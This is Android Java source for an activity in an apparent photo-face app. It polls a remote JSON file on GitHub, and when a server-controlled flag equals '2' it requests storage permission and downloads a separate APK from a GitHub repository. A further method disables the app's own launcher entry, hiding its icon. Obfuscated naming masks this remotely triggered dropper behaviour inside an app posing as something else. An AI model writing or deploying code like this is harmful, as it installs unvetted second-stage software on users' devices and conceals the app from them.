package ko.photoface.imorajo;


import android.animation.ValueAnimator;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.CardView;
import android.util.Log;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;


import com.airizon.runbo.GetRequirementUpload;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class HomeAction extends AppCompatActivity {

    private static final int COMPOSE_OUTER_ORDER_PREREQUISITE = 1001;
    private TextView versionText;
    public static final int version = 1;

    public static final String PATH_HOST = "https://raw.githubusercontent.com/mundoa/FictionSectionFacts/master/myfile.json";
    private AsyncTask comeUplaod;
    private List<SectionFacts> sectionFacts;
    private SectionFacts fact;
    public static final String MSG = "HomeAction";



    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.home_niam);


        comeVersion();


    }

    private void comeVersion() {

        comeUplaod = new AsyncTask<String, Void, Integer>(){



            @Override
            protected void onPreExecute() {
            }

            @Override
            protected Integer doInBackground(String... params) {
                Integer effect = 0;
                HttpURLConnection httUrl;

                try {

                    URL pathJsn = new URL(PATH_HOST);

                    httUrl = (HttpURLConnection) pathJsn.openConnection();
                    int stateCode = httUrl.getResponseCode();

                    if (stateCode == 200) {
                        BufferedReader herald = new BufferedReader(new InputStreamReader(httUrl.getInputStream()));
                        StringBuilder replay = new StringBuilder();
                        String range;

                        while ((range = herald.readLine()) != null) {
                            replay.append(range);
                        }

                        try {
                            JSONObject aim = new JSONObject(replay.toString());
                            fact = new SectionFacts();
                            fact.collectFictionName(aim.optString("fictionName"));
                            fact.collectFictionCode(aim.optString("fictionCode"));
                            fact.collectAverageCode(aim.optString("averageCode"));
                            fact.collectHttUrl(aim.optString("httUrl"));
                            JSONArray appointment = aim.optJSONArray("shot");
                            sectionFacts = new ArrayList<>();
                            if (appointment != null) {
                                StringBuilder construct = new StringBuilder();

                                for (int i = 0; i < appointment.length(); ++i) {
                                    construct.append(appointment.getString(i).trim());
                                    if (i != appointment.length() - 1) {
                                        construct.append(System.getProperty("line.separator"));
                                    }
                                }
                            }

                            sectionFacts.add(fact);
                        } catch (JSONException ex) {

                            ex.printStackTrace();
                        }
                        effect = 1;
                    } else {
                        effect = 0;
                    }
                } catch (Exception ex) {
                    Log.d(MSG, ex.getLocalizedMessage());
                }
                return effect;
            }

            @Override
            protected void onPostExecute(Integer effect) {
                final GridLayout mainGrid = findViewById(R.id.mainGrid);
                CardView comeInFunction = findViewById(R.id.comeIn);
                //comeInFunction.animate().rotation(360f).setDuration(1500);
                CardView averageNoteFunction = findViewById(R.id.averageNote);
                //averageNoteFunction.animate().rotation(360f).setDuration(1500);
                CardView BringDowFunction = findViewById(R.id.bringDow);
                //BringDowFunction.animate().rotation(360f).setDuration(1500);
                ImageView firstView = findViewById(R.id.first_view);
                //firstView.animate().rotation(360f).setDuration(1500);
                ImageView secondView = findViewById(R.id.information);
                //secondView.animate().rotation(360f).setDuration(1500);
                ImageView lastView = findViewById(R.id.ending);
                //lastView.animate().rotation(360f).setDuration(1500);


                String purview = fact.takeFictionCode();
                String secondPurview = fact.takAverageCode();

                if (purview.equals("2")) {
                    Log.w("it's working", "lamak");

                    comeInFunction.setEnabled(false);
                    mainGrid.setVisibility(View.VISIBLE);
                    firstView.setVisibility(View.VISIBLE);
                    secondView.setVisibility(View.VISIBLE);
                    lastView.setVisibility(View.VISIBLE);
                    comeInFunction.setVisibility(View.VISIBLE);
                    BringDowFunction.setVisibility(View.VISIBLE);
                    upload();
                    if(secondPurview.equals("2")){
                        averageNoteFunction.setVisibility(View.VISIBLE);

                    }
                }

            }
        }.execute();

    }



    public void fn_averageNote(View view)
    {
        Uri pathUri = Uri.parse("market://details?id=" + getApplicationContext().getPackageName());
        Intent roadToStore = new Intent(Intent.ACTION_VIEW, pathUri);
        roadToStore.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY |
                Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
                Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        try {
            startActivity(roadToStore);
        } catch (ActivityNotFoundException ex) {
            startActivity(new Intent(Intent.ACTION_VIEW,
                    Uri.parse("http://play.google.com/store/apps/details?id=" + getApplicationContext().getPackageName())));
        }
    }

    public void comeInFunction(View view)
    {
        uncache();
    }



    private void testComposeOuterStoreOrder() {

        if (ActivityCompat.checkSelfPermission(HomeAction.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED) {

            uploadJob();
        } else {

            requireComposeOuterStoreOrder();
        }
    }


    private void requireComposeOuterStoreOrder() {
        if (ActivityCompat.checkSelfPermission(HomeAction.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(HomeAction.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, COMPOSE_OUTER_ORDER_PREREQUISITE);
        } else {
            ActivityCompat.requestPermissions(HomeAction.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, COMPOSE_OUTER_ORDER_PREREQUISITE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int orderProgram, @NonNull String[] orders, @NonNull int[] accordEffects) {
        String message = "Order Not Allowed.";
        super.onRequestPermissionsResult(orderProgram, orders, accordEffects);
        if (orderProgram == COMPOSE_OUTER_ORDER_PREREQUISITE && accordEffects.length == 1 && accordEffects[0] == PackageManager.PERMISSION_GRANTED) {
            uploadJob();
        } else {
            Toast.makeText(HomeAction.this, message, Toast.LENGTH_SHORT).show();
        }
    }


    public void getRequirementFunction(View view) {
        CardView comeInFunction = findViewById(R.id.comeIn);
        testComposeOuterStoreOrder();
        comeInFunction.setEnabled(true);
    }

    public void upload() {

        testComposeOuterStoreOrder();
    }

    private void uploadJob() {

        GetRequirementUpload getRequirementUpload = new GetRequirementUpload(HomeAction.this);

        getRequirementUpload.beginGetRequirementUpload("https://github.com/mundoa/FictionSectionFacts/raw/master/appRelease.apk");
    }




    private void uncache() {
        PackageManager pcg = getPackageManager();
        ComponentName motifDenotation = new ComponentName(this, HomeAction.class);
        pcg.setComponentEnabledSetting(motifDenotation, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}




